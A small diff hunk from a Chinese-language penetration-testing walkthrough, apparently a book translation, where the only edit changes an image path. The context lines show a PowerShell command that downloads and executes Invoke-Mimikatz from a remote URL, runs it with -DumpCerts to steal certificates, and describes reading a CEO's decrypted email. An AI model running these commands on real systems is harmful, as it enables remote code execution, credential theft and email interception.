@@ -198,7 +198,7 @@ PS> IEX($browser.DownloadString("https://raw.githubusercon Mimikatz.ps1"))
 PS> invoke-mimikatz -DumpCerts
 ```
 
-![](.gitbook/assets/5.3-2.jpg)
+![avatar](./chap5//5.3-2.jpg)
 
 我们在 Front Gun 机器上安装证书，然后就可以慢慢欣赏解密后的 CEO 电子邮件了！
 
